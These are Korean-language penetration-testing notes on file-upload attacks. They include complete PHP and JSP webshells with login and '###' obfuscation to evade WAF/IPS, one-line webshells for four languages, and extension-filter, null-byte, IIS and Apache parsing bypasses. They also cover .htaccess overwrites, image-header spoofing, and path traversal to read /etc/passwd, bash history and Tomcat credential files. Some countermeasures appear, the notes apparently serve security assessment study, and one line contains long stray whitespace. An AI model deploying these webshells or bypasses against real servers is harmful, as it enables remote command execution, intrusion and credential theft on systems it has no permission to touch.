@@ -1,0 +1,1285 @@
+
+파일 업로드
+	php 파일체크 및 임시 업로드 파일 이동
+		<?
+			if(empty($_FILES["userfile"]["name"]))
+			$path="./upload/";
+			$filename= $_FILES["userfile"]["name"];
+			if(!move_uploaded_file($_FILES['userfile']['tmp_name'], $path.$filename)){}
+		?>
+		<li><?=$path.$filename?></li>
+		// $_FILES['userfile']['name'] 클라이언트 머신에 존재하는 파일의 원래 이름. 
+		// $_FILES['userfile']['type'] 브라우저가 이 정보를 제공할 경우에, 파일의 mime 형식. 예를 들면 "image/gif". 
+		//$_FILES['userfile']['size'] 업로드된 파일의 바이트로 표현한 크기.
+		등등
+		
+	jsp 파일 업로드 
+		라이브러리 사용하여 업로드
+			cos.jar (O' Reilly) => 파일명 핸들링
+			commons-fileupload.jar(Apache)
+			Spring ~2.0 -> cos.jar
+			Spring 2.5 ~ => commons-fileupload.jar 사용
+		String path = request.getRealPath("upload");
+		MultipartRequest multi = new MultipartRequest(request, path, 1024*10,"UTF-8");
+		String filename = path + "\\" + multi.getFilesystemName("userfile"); // 저장되는 파일명
+		String name = request.getParameter("name")//form 내 파일명 지정시
+		
+	웹쉘
+		ex_ jsp file browser 웹쉘(브라우저 기능, 안전), c99shell(db 열람)
+		https://github.com/tennc/webshell
+		
+		진단시 주의
+			1.테스트 파일 선행 (echo test)
+			2. 유추 어려운 웹쉘 파일명 (악의적인 사용자 이용)
+			3. 접근제어 설정 (로그인 사이트 경우 로그인된 진단 사용자만)
+			4. 검증된 안전한 웹쉘
+			5. 진단 이후 웹쉘 삭제
+		
+		웹쉘 솔루션
+			metiEye, anti(w-shield), wss shellmonitor, wsfinder
+			waf도 가능하지만 별도 솔루션
+			+백신
+		
+		언어별 시스템 함수(솔루션 체크)
+			php - passthru, system, `(백 쿼터), execl, popen, escapeshellcmd, eval, shell_exec, assert ...//매우 많아 난독화등으로 어려움
+			jsp - Runtime.getRuntime().exec(""), processBuilder("") //processBuilder를 탐지 못하는 경우 종종
+			ASP - CreateObject("wscript.shell").exec("cmd /c"& cmd), eval, Execute...
+			ASPX - WinExec(), ShellExecute()...
+		
+		php 심플 웹쉘(인증 기능, cmd사용)
+				
+			웹쉘 올라가지만 구간 보안 솔루션에 의해(waf, ips) 명령어 차단
+			난독화(base64, # 이용(i###p###c###o###n###f###i###g###), 암호화도 가능할듯)
+			
+			php
+			//cmd.php?cmd=ipconfig
+			<?
+				@session_start();
+				
+				$password="test123" # hash 화 필요
+				$input_password= $_POST["password"];
+				$page = $_SERVER["PHP_SELF"];
+				$cmd =$_POST["cmd"];
+				
+				if(empty($_SESSION["webshell_id"]) && empty($input_password)){
+					?>
+					<form action="<?=page?>" method="POST">
+					<input type="password" name="password">
+					<input type="submit" value="auth">
+					</form>
+					<?
+					exit(); //구문 종료안할시 계속 진행되어 아래 form 수행
+				}else if(empty($_SESSION["webshell_id"]) && !empty($input_password))
+				{	if($password==$input_password){//md5($input_password) 등 변환
+					$_SESSION["webshell_id"] = "testid";
+					echo "<script>location.href='{$page}'</script>";
+					exit();
+					}else{
+						echo "<script>location.href='{$page}'</script>";
+						exit();
+					}
+				}
+				if(!empty($cmd)){
+					$cmd = str_replace("###", "", $cmd);
+					$result = shell_exec($cmd); //결과반환
+					$result = str_replace("\n","<br>",$result);
+					echo $result
+				}
+				//system($_GET["cmd"]);
+			?>
+			<script>
+				document.addEventListener("keydown", (event)=>{if(event.keyCode===13){cmdRequest()}})
+				function cmdRequest(){
+					var frm = document.frm;
+					var cmd = frm.cmd.value;
+					var enc_cmd="";
+					for(i=0; i<cmd.length; i++){
+						enc_cmd+= cmd.charAt(i)+"###"
+					}
+					frm.cmd.value=enc_cmd;
+					frm.action="<?=$page?>";
+					frm.submit();
+				}
+			</script>
+			<form name="frm" method="POST">
+			<input type="text" name="cmd" value="<?=$cmd?>">
+			<input type="button" onClick="cmdRequest();" value="EXECUTE">
+			</form>
+		
+		
+		
+		jsp 심플 웹쉘(인증 기능, cmd사용)
+			웹쉘 올라가지만 구간 보안 솔루션에 의해(waf, ips) 명령어 차단
+			난독화(base64, # 이용(i###p###c###o###n###f###i###g###), 암호화도 가능할듯)
+			
+			<%@ page contentType="text/html; charset=UTF-8" %>
+			<%@ page import="java.io.*" %>
+			<%
+				String cmd = request.getParameter("cmd");
+				Process ps = null;
+				BufferedReader br =null;
+				String line ="";
+				String result="";
+				String page_n= request.getServletPath();
+				String password="test123";
+				String input_password=request.getParameter("password");
+				String id = (String)session.getAttribute("webshell_id");
+				String os = System.getProperty("os.name").toLowerCase();
+				String shell="";
+				
+				try{
+					
+					if(id == null && input_password ==null){
+						%>
+						<form action="<%=page_n%>" method="POST">
+						<input type="password" name="password">
+						<input type="submit" value="auth">
+						</form>
+						<%
+						return;
+					}else if(id==null && input_password !=null){ // 세션 우회 가능
+						if(password.equals(input_password))
+						{	
+							session.setAttribute("webshell_id", "test123");
+							response.sendRedirect(page_n);
+						}else{{
+							response.sendRedirect(page_n);
+						}
+					}
+					if(os.indexOf("win") == -1){
+					
+						shell = "/bin/sh -c ";
+					}
+					else
+					{	
+						shell = "cmd.exe /c ";
+					}
+					
+					if(cmd != null){
+						cmd=cmd.replace("###","");
+						ps=Runtime.getRuntime().exec(cmd);
+						//바이트 스트림 > 문자 스트림 > 버퍼저장
+						br=new BufferedReader(new InputStreamReader(ps.getInputStream()));
+						
+						while((line = br.readLind()) != null){
+							result += line +"<br>";
+						}
+						//out.println(result);
+						ps.destroy();
+					}
+				} finally{
+					if(br!=null) br.close();
+				}
+			%>
+			<script>
+				document.addEventListener("keydown", (event)=>{if(event.keyCode===13){cmdRequest()}})
+				function cmdRequest(){
+					var frm = document.frm;
+					var cmd = frm.cmd.value;
+					var enc_cmd="";
+					for(i=0; i<cmd.length; i++){
+						enc_cmd+= cmd.charAt(i)+"###"
+					}
+					frm.cmd.value=enc_cmd;
+					frm.action="<?=$page?>";
+					frm.submit();
+				}
+			</script>
+			<form name="frm" method="POST">
+			<input type="text" name="cmd" value="<?=$cmd?>">
+			<input type="button" onClick="cmdRequest();" value="EXECUTE">
+			</form>
+			<hr>
+			<%=result%>
+	
+	
+	공격대상 탐색
+		1. 웹 페이지 내 업로드 관련 코드찾기
+			주석제거, js 파일 내 업로드 폼(url)확인
+		2. 파일 다운로드 취약점을 통한 접근
+			파일 다운로드 -> 업로드 존재 유추, url 유추 가능(filedowind.jsp-> fileupload.jsp) OR 
+			filename = fileUpload.jsp 로 페이지 다운 -> 파일 업로드 페이지 다운및 접근으로 소스코드 확인 -> 직젖ㅂ 업로드 폼 제작 후 웹쉘 업로드
+			파일 업로드 폼x 업로드 모듈은 존재 : 모듈만 있어도 다운로드 취약점을 통해 업로드 모듈 소스코드 확인이가능하니 공격 가능
+		3. was 관리자 콘솔 & 관리자 페이지 접근
+			관리자 페이지 war(소스코드 압축파ㅣㄹ) 배포, ADMin 사이트 유추 접근으로(admin,adm, manager,rhks(rhksflwk), test.co.kr -> test1.co.kr), 포트접근
+			war파일을 만들어서 파일업로드? 
+			tomcat - url/manager/html
+			JEUS - url:9743/webadmin, url:9744/webadmin
+			Weblogic - url:7001/console
+			WebSphere - url:9060/ibm/console
+			Jboss - url:9990/admin-console
+			www.vulnerable.com/lalala/..;/manager/html에 접근하여 Tomcat 관리자 페이지에 접근할 수 있을 것입니다.
+			이 트릭을 사용하여 보호된 경로를 우회하는 또 다른 방법은 http://www.vulnerable.com/;param=value/manager/html에 접근하는 것
+			관리자 페이지 접근 후 - "배치할 WAR 파일" 이러한 형태의 업로드가 존재 
+				jar -cvf test.war test.jsp
+				or 그냥 압축 war
+				업로드 시 별도의 서비스로 생성됨
+				test/test.jsp에 쉘 등록됨
+				tomcat-users.xml 등 파일 다운로드 취약점 이용하여 계정정보 획득
+				
+		4. 접근 권한 없는 업로드 폼 페이지 직접 접근
+			네이밍(유추)
+		5. 에디터 샘플 및 기본페이지
+			ckeditor는 웹디렉터리상 업로드하며 경로 반환
+			/fckeditor/, /FCKeditor/, /ckeditor/, /CKEditor/, /Ckeditor/, /editor/ -> size, 응답 페이지의 존재 참/거짓유무 차이를 보고 판단가능
+			/디렉터리/fckeditor.js, /디렉터리/fckconfig.js /디렉터리/ckeditor.js /디렉터리/config.js (에디터 사용 유추)
+			/디렉터리/sample/index.html, 디렉터리/_sample/index.html
+			[호스트]/FCKeditor/editor/filemanager/browser/default/connectors/test.html 
+			[호스트]/FCKeditor/editor/filemanager/upload/test.html 
+			[호스트]/FCKeditor/editor/filemanager/browser/default/browser.html 
+			※ 참고 사항 : FCKeditor Sample File 위치 : /FCKeditor/_samples/index.jsp 
+			ASP 
+				/FCKeditor/editor/filemanager/browser/default/connectors/test.html 
+				/FCKeditor/editor/filemanager/upload/test.html 
+				/FCKeditor/editor/filemanager/browser/default/browser.html 
+			PHP 
+				/FCKeditor/editor/filemanager/browser/default/connectors/test.html 
+				/FCKeditor/editor/filemanager/upload/test.html 
+				/FCKeditor/editor/filemanager/browser/default/browser.html 
+			JSP 
+				/FCKeditor/editor/filemanager/browser/default/connectors/test.html 
+				/FCKeditor/editor/filemanager/upload/test.html 
+				/FCKeditor/editor/filemanager/browser/default/browser.html 
+			파이썬 코드로 자동 체크		
+		6. 구글 해킹을 통한 업로드 페이지 접근
+			구글 이전 페이지 url 패턴등 확인 가능, 파라미터 형태 등
+			저장된 페이지
+		7. 유추 접근
+	
+	환경 파악
+		운영체제 파악
+			대소문자 변경 -> js/coMMon.js => 되면 WINDOWS, 안되면 리눅스,유닉스
+			톰캣은 윈도우라도 구분함
+			프레임워크에 따라도 WAS 에따라도 다 달라서
+			추측만
+		언어 파악
+			확장자(.do, .action, .jsp등등), 응답 헤더, 에러페이지,
+	
+	기본 로직 및 검증 로직 분석
+		테스트 파일
+			php -<? echo "test"; ?>
+			jsp - <% out.println("test");%>
+			asp - <% Response.Write("test");%>
+		
+		검증로직 유무 -> 검증로직 우회 -> 업로드 경로 파악 -> (파악 실패)업로드 경로 변조 -> 업로드
+		
+		검증로직 유형
+			확장자 검증(.JSP 등)
+				검증 되지 않은 확장자 사용(블랙리스트)
+					** 의미없는 확장자( test.a )를 이용하여 화이트/블랙 확인
+						<?
+						if(empty($_FILES["userfile"]["name"])){
+							..
+						}
+						...
+						$file_info = pathinfo($path.$filename);
+						$ext=strtolower($file_info["extension"]);
+						$ext_arr = array("php","php3","php5","html","htm");
+						if(in_array($ext, $ext_arr)){
+							exit();
+						}
+					java - jsp/jspx/jspf/jsv/jsw...
+					asp-asp/asa/cer/cdx ...
+					aspx(.net) - aspx/asax/ascx/ashx/asmx/soap ... (asp 확장자 같이사용가능)
+					php - php/php3/php4/php5/html/phtml/inc ...
+					이외의 확장자를 통한 우회
+					
+					[jspx] 코드가 다름
+						<jsp:scriptlet>
+						out.println()
+						</jsp:scriptlet>
+						해당 코드 방식으로 작성해야한다.
+						C:\Users\trace\Desktop\Penestation_tool\crehacktive_jspx_ServerSideScript 웹쉘 확인
+							<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+							<jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
+							<jsp:directive.page import="java.io.*"/>
+							<jsp:scriptlet><![CDATA[
+								String cmd = request.getParameter("cmd");
+								String now_page = request.getServletPath();
+								Process ps = null;
+								BufferedReader br = null;
+								String line = "";
+								String result = "";
+								String os = System.getProperty("os.name").toLowerCase();
+								String shell = "";
+				
+				확장자 검증 로직 설계 오류 결함 악용
+					블랙리스트 방식으로 인한 결함
+						윈도우 환경 비호환 문자(. , 공백, ::$DATA(ADS)) 를 .PHP 뒤에 붙여 제거
+							test.php.
+							$ext_offset=strrpos($filename,".")// 마지막 .  
+							$ext = substr($filename, $ext_offset+1,3); //널이 들어감
+							if($ext=="php" ...){} -> null 값 검증이 없어 우회 가능
+							
+							test.php[공백], test.php::$DATA, 대문자(phP)
+							$file_info = pathinfo($path.$filename);
+							$ext=strtolower($file_info["extension"]);
+							$ext_arr = array("php","php3","php5","html","htm"); 
+							if(in_array($ext, $ext_arr)){ -> 해당 배열에 없으므로 우회
+						
+						첫 확장자 검증 보안 결함
+							test.png.php
+							$ext_offset=strpos($filename,"."); // strpos 는 앞에서, strrpos는 뒤에서
+							$ext = substr($filename, $ext_offset+1,3);
+							-> 대응으로 strrpos 사용, 화이트리스트
+							
+						로직 설계 오류
+							클라이언트에서 체크
+								--aBoundaryString
+									Content ...
+									N -> Y 로 변조
+							파일 확장자와 검증 확장자와 분리
+								--aBoundaryString
+									...
+									jsp
+								--aBoundaryString
+									... filename="test.jsp"
+																			
+				**null byte 문자 사용**
+					1. test.jsp[null].jpg -> jsp의 경우 해당.jpg 를 포함하여 업로드되나 실제 파일 오픈시 널 뒤에가 날아감
+					2. form-data; name="file_n"; filename="test.jpg" => name 의 file_n 이  실제 파일명으로 들어가는 경우 존재
+						-> file_n_1235463.jpg
+						-> name="test.jsp[null]"
+							-> test.jsp[null](뒤 날라감)_12356.jpg
+					- 요청 메시지 GET
+						<form action="upload.php?gubun=file" enctype="multipart/form-data">
+						
+						$gubun = $_GET["gubun"];
+						path = "./upload/";
+						$filename= $gubun."_".$_FILES["userfile"]["name"] 
+							-> test.png => file_test.png
+							filename의 값만이 아니라 get 방식에서 전달되는 인자값을 확인이 필요하다.
+						
+						"filename"에 널바이트를 넣는거는 의미없다
+							-> php는 filename에 이미 전송부터 널바이트가 짤려버려 만약 test.php[null].png 시 php로 차단됨(되는경우도존재) -> $_FILES["userfile"]["name"] 애초여기서 null 짤림
+							-> 따라서 get 파일명 인자값에 널바이트를 전송 
+								=> gubun=test.php%00 => test.php(뒤 날라감)_test.png 
+								응답에는 test.php _test.png 로 뜸. $gubun에 삽입되어 각각 붙여져서 전송
+								
+					- 요청 메시지 POST
+						--aBoundaryString body 값 안에
+						
+						<form action="upload.php" method="POST" enctype="multipart/form-data">
+						<input type="file" name="userfile">
+						<input type="hidden" name="gubun" value="file">
+						...
+						$gubun = $_POST["gubun"];
+						...
+						$filename= $gubun."_".$_FILES["userfile"]["name"] 
+						
+							----------314014...
+							Content-Disposition: form-data; name="gubun"
+							
+							file => test.php%00 이 아니라 => test.php 이렇게 디코딩 // 바디 영역은 mulipart/form-data 인코딩에 영향을 받지만 get은 아님 url 인코
+							-------... 
+						
+						//* URL Encoding : Ctrl + u * URL Decoding : Ctrl + Shift + u
+					- 요청 메시지 쿠키헤더검증된 확장자 바인딩
+						
+						<? 
+						setcookie("gubun","file");
+						?>
+						...
+						$gubun = $_COOKIE["gubun"];
+						$filename= $gubun."_".$_FILES["userfile"]["name"];
+						...
+						cookie: gubun=test.php%00 -> 업로드 가능
+						
+					- 요청메시지 POST(파라미터명)(name="test")
+					
+					- trim 공백 제거 우회
+						개발자는 공백제거 처리를 함, trim() 함수를 사용함 입력값 양옆 공백제거 
+						trim($_GET["gubun"]);
+							gubun=aa.php%00 -> aa.php_ha.png 공백 제거
+							** 가운데는 제거 안함
+							gubun= aa.php%00aa => %00뒤에는 어차피 날라가니
+					
+					- 시큐어 코딩 적용
+						1. 널바이트 문자 제거 => \0 제거
+						2. 널바이트 문자 검증 -> \0 -> 에러처리
+						if(strpos($gubun, "\0") !== false){
+							echo "<script>비허용문자</script>"
+							exit();
+						}
+						3. 정규식 검증된
+							if(!preg_match("/^[0-9a-zA-Z_]*$/",$gubun)){
+								echo "<script>비허용문자</script>"
+								exit();
+							}
+						4. 이스케이프 처리 -> \0 -> \\0
+						
+		
+					대응방안
+						null byte 문자 검증
+						서버측 생성된 임의의 파일명과 검증된 확장자 바인딩
+						웹 디렉터리가 아닌 다른경로 업로드(또는 실해권한 없는 디렉터리)
+						특수문자 필터링
+					
+					
+				was 취약점 이용
+					iis 세미콜론 취약점(2009, iis6)
+						cmd.asp;.jpg -> 우회
+						전체 파일명으로 저장되나, 확장자 파싱시 제거됨, (즉 해당 문구가 전체 다 저이름으로 저장된다? 의심)
+						
+						대응방안
+							iis 상위버전
+							파일명 내 세미콜론 문자 검증
+								If instr(FileName, ";") <> 0 Then
+									Response.Write"<script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </script>");
+						return;
+					}
+					
+					iis 디렉터리 파싱 취약점
+						gubun=cmd.asp
+						cmd.asp 디렉터리 생성
+						cmd.asp/test.jpg
+						-> cmd.asp/test.jpg 접근시 asp 에서 파싱 되서 test.jpg에 작성된 웹쉘코드 동작됨
+						
+						대응
+							iis 상위
+							디렉터리 구분 사용되는 입력 값 검증
+								SET regEx=NEW RegExp
+								regEx="[^a-z0-9]"
+								regEx.ignoreCase=True
+								regEx.Global=True
+								SET Matches = regEx.Execute(FileDir)
+							웹 디렉터리가 아닌 경로 업로드
+							
+					apache 다중 확장자 취약점
+						블랙리스트
+							mime.type 에 정의되지 않은 확장자 
+							web.php.aa -> 웹쉘 실행(php)
+						
+						화이트 리스트
+							addhandler 사용, addtype
+							addhandler 우선순위가 높아짐
+							addhandler application/x-httpd-php .php .html
+							webshell.php.jpg -> .php 로 인식
+						대응
+							보안 설정 추가
+							<FilesMatch "\.php$">
+								SetHandler application/x-httpd-php
+							임의의 파일명과 검증된 확장자 바인딩
+							웹 디렉터리가 아닌 경로 업로드
+					
+			이미지 검증
+				타입 검증 우회
+					Conten-Type: image/jpeg 로 변경하여 우회
+				헤더검증 우회
+					이미지 헤더가 이미지가 아니어서 검증된
+					GIF - 47 49 46 38  39 (GIF89)
+					PNG - 89 50 4E 47 (%PNG)
+					JPG - FF D8 FF E0 (y0ya)
+					해당 헤더를 삽입하여 우회
+					-> 이미지 파일 업로드 하고 패킷 잡은후 php 변경, 이미지 헤더 및에만 제거해여 웹쉘 코드 삽입
+				
+				사이즈 검증 우회
+					업로드 시 가로 세로 사이즈 검증
+					이미지 데이터 사이 웹쉘 코드 삽입
+					이미지 사이즈 작게한후 그냥 아래에 코드 삽입
+				대응방
+					확장자 검증 로직 추가
+					웹디렉아닌 다른경로 업로그+이미지 뷰어
+					웹서버 웹디렉터리에 업로드(웹 어플 디렉과 다른)
+			
+			파일 사이즈 검증
+				원라인 웹쉘
+				java - <% Runtime.getRuntime().exec(request.getParameter("val")); %>
+				ASP - <% eval request("val") %>
+				aspx(.net) - <%@ Page Language="Jscript" %><% eval(Request.Item["val"],"unsafe";%>
+				PHP - <?php @eval($_POST["val"]);?>, <?php system($_POST["val"]); ?>...
+				
+				?val=echo "test";
+				?val=system("ip"."con"."fig");
+				?val=eval(base64_decode("rhrt=="))
+				CAIDAO 프로그램으로 원라인 웹쉘 진행
+			
+			
+	업로드 경로 파악
+		파일 다운로드 취약점 통한 업로드 경로 파악
+			웹디
+			?path=../common&filename=fileupload.jsp
+				-> fuullpath=" 업로드 주소"
+			
+			웹디x
+			?path=../../../../../jeus/webApps/service01/common&filename=fileupload.jsp
+			
+			오늘날 java 웹 환경의 class 소스코드 파다가 어렵다
+			-> 설정 파일에 정보를 담고있다.
+			
+			web.xml 
+				classpath*:egovframework/spring/com/context-*.xml
+				-> context-properties.xml
+					<entry key="Globals.fileStorePath" value="/upload/service01"/>
+			이외 설정파일 예씨
+				[웹 디렉터리]/WEB-INF/하위
+					root-context.xml , servlet-context.xml, context-common.xml
+			
+			웹 디렉터리 체크
+				인덱스, 웹설정파일 다운로드 체크
+				
+				JAVA - index.html, index.jsp, /WEB-INF/web.xml, /WEB-INF/jsp/index.jsp
+				PHP - index.html, index.php, .htaccess
+				ASP .NET(ASPX) - index.html, default.html, default.asp, default.aspx, index.asp, index.aspx, web.config, global.asa
+				filedownload.jsp?filename=../../../../../WEB-INF/web.xml
+				filedownload.jsp?filename=../../../../WEB-INF/web.xml
+				filedownload.jsp?filename=../../../WEB-INF/web.xml
+				...
+				path=../WEB-INF&filename=web.xml
+					-> 해당 파일이 다운로드 될 시 설정파일내 업로드 경로가 없을겨우
+					path=notice&filename=a.jsp 인 경우
+					../ 한번으로 WEB-INF에 접근되었단경우는
+					TEST/WEB-INF/xml
+					TEST/???/notice/a.jsp
+					-> 인 경우이므로 ??? 하나만 유추하면 된다
+			
+		sql 인젝션 통한
+			SEQ= 193 
+			seq | filename | path
+			인젝션 취약점 찾아서 union 또는 blind 으로 획득
+		
+		
+		유추와 추론
+			upload, upFile, uploadFile, 대소문자, upload_file, upload_files, up, data 등등
+			프로필 사진, 게시판 이미지 등등 확인
+			업로드/기능/날짜 ...
+			
+		에러를 통한
+			filename="ha.png?"(윈도우서버 ) 
+			웹 os및 어플리케이션에맞는 에러 발생 시키기 
+			앞을 지운다거나, 특수문자삽입, 파일 길이 대용량 등등 다양한
+		
+	업로드 경로 변조
+		웹 디렉터리x, 웹디렉터리나 스크립트 실행x, 경로 파악 불가, 다른 서버/파티션
+		기능별 업로드 디렉터리를 구분하므로 경로 변조 유용
+		1. ----aBoundaryString
+			name="gubun"
+			community -> 변경
+		2. ?gubun=commnunity
+		3. cookie: ~~; gubun=commnunity
+		
+		가능여부 파악
+			community -> / 변조 (community와 동일한 위치에 파일 생성)
+				-> community&filename=test.txt 받아봐서 테스트 (다운로드x -> 경로변조 성공 추측)
+				-> seq=100 이렇게 받는 경우 경로 변조 성공해도 다운받아질수있다(seq로 질의하니 변조된 "/"에서 찾음)
+				-> gubun=/&filename=test.txt 시도
+				-> gubun 값 ../ 로 변조 테스트 
+				-> gubun=../&filename=test.txt 시도
+				100% 가능
+		
+		스크립트 실행 x - /WEB-INF/uplaod/ 에 존재가능성 (WEB-INF는 디폴트 실행권한X)
+			url/WEB-INF/uplaod/community/a.jsp -> comunity 를 ../../ 로 변조 -> url/a.jsp 로 접근 테스트
+			=> 웹 디렉터리 최상단(최상단 체크)
+			점진적 이동 ../ ../../ -> 테스트 (테스트파일)
+			안되면 웹디렉터리가 아닌경우
+		
+		웹디가 아닌경우
+			환경 설정 파일, 톰캣 등 확인하여 웹디파악
+			community -> ../../web_service/service1 변조 (점진적 확인)
+				-> url/a.jsp (최상단 체크)
+		
+		실습
+		1. 실행 폴더 변조
+			form-data; name="page"
+			community -> 실행권한 x
+			form-data; name="page"
+			../ -> 실행
+		
+		2. .htaccess 변조
+			a.php -> a.a 허용 = 블랙리스트
+			filename="a.php." 변조
+			name="page" notice -> ../ 변조(차단) 
+				-> test 변조( 실행x)
+			.htaccess 생성
+				filename=".htaccess"
+				<FileMatch "\.php$">
+				SetHandler application/x-httpd-php
+				</FileMatch>
+				--------
+				... name="page"
+				test (-> 생성한 test 폴더의 설정변경)
+			test 폴더내 a.php. 재 성성
+			test/webshell.php?cmd=whoami 실행
+		
+		3. 소스코드 확인
+			대소문자 체크 -> 윈도우
+			filename="a.php?><" 에러 발생 -> x
+			download.jsp?file=../download.php -> ../../download.jsp 다운로드 (업로드폴더기준)
+			소스코드 내 include_once("./inc/common.php")
+				file=../../inc/common.php 다운
+					attach/contact 경로 확인
+					upload/attach/contact/a.jsp?cmd=whoami
+		
+		4. 경로파악 실패 경로변조
+			정보 전혀 없을때 
+			name="page" ../ 로 변조하여 업로드 최상위 업로드
+		
+		5. 다운로드x, 경로x
+			윈도우파악, filename="web.p>hp" -> 에러 발생 
+			경로 확인(c:\file...-> 웹디x), 웹디 에러내 파악가능
+			name="page"
+				../../APM_Setup\htdocs\pra\ 변조
+		
+		6.
+			gb=contact&file=../contact/test.png -> 체크
+			file=../../../../etc/passwd
+			gb=../../../../etc/&file=passwd
+			대소문자x - > 리눅스
+			../../../../../../WEB-INF/web.xml -> x
+			../../../../../../index.jsp -> x
+				웹디x
+			../../../../../../proc/self/environ - 웹디 정보 확인 (PWD)
+				- /~/upload2
+			../../../../../../test/test2/upload2/index.jsp -> 다운 테스트
+			../../../../../../test/test2/upload2/download.jsp
+			../../../../../../test/test2/upload2/inc/common.jsp -> 업로드 경로 확인
+			../../../../../../test/test2/upload2/contact/test.png -> 접근 성공
+			
+			../../../../../etc/passwd -> 사용자 확인
+			../../../../../../root/.bash_history
+			/usr/local/tomcat/conf -> 톰캣 설치 경로 확인
+			../../../../../..//usr/local/tomcat/conf/server.xml -> 웹디 파악
+			
+			gb = ../../../../../test/test2/upload2
+			filename="test.jsp"
+			<% out.println("test");%>
+			
+		
+		7. js/common.js 체크
+			업로드 폼 페이지 확인 등등
+		
+		8. 주석 업로드폼 체크 
+		
+		9. 이미지 게시글 경로 확인, 이미지 검증 우회( 이미지 뒤에 쉘코드 삽입, content-header 변경)
+		
+		10. 업로드 미존재
+			download.php?filename=../../index.html -> 체크 웹디
+			유추 upload.php -> 파라미터 직접 제공하여 수행
+				-> download.php? filename=../../common/upload.php 다운하여 분석
+				$path="../upload"
+				type에 따른 1= image 등등
+				대문자 필터링 미존재
+				
+				<form action="http://url/upload4/common/upload.php?type=5" method="post" enctype="mulipart/form-data">
+				<input type="file" name="userfile">
+				<input type="submit">
+				</form>
+				파일 만들어서 전송
+				name="userfile"; filename="test.phP" -> 전송
+		
+		11. 업로드 폼x , 업로드 경로x
+			enctype을 찾아서 검색
+			download.php 존재 ->파일이 존재하지않습니다 (파라미터 x)
+				파라미터 유추 download.php?filename=test
+			filename=../download.php -> 업로드 폴더만 유추하면됨
+			filename=../common.php
+				-> path="data" -> 업로드 디렉터리 확인
+			게시판 작성 페이지 의 form 의 action 경로 체크 -> action.php
+			filename=../action.php 다운
+				-> 업로드 정보 확인가능
+			응답값 게시글을 변경하여 파일등록할 수 있게 변경 (<input type="file" name="userfile"> 추가)
+				파일 업로드
+			data/webshell.php?cmd
+			
+		12. 업로드 폼 직접 접근시 접근 차단 -> reffer 값 검증 추측
+		
+		13. download.php?gubun=board&idx=10 설계오류
+			수정페이지 접근 -> oldfile 확인
+			oldfile 변경 -> test.php -> idx=10 접근시 빈 파일 접근됨
+			idx와 더불어 oldfile 로 접근이 되는데 없음
+			
+			../../index.php 로 변조 ->다운로드 수행시 다운됨
+			../../common.php , ../../action.php 등 다운
+			gubun=image, board 등등 실행권한있는데로 변경
+			
+		14. cookie
+			cookie:menu=contact; ...
+			cookie:menu=cont../act;, menu=../contact 등등 체크
+			cookie:menu=../ , file=download.php -> 파일 다운로드
+			cookie:menu=../ , file=common.php -> 파일 다운로드
+			
+		15. * 저장된 이미지 파일명 이용
+			(확장자+이미지 검증)
+			filename="logo.pn" -> x -> 화이트리스트
+			업로드된 파일이 어떻게 됬는지 확인 
+			php?type=img
+				name="img"; filename="logo.png" -> img_12352135.png 
+			type=test.php%00 (get) -> test.php _2114125.png
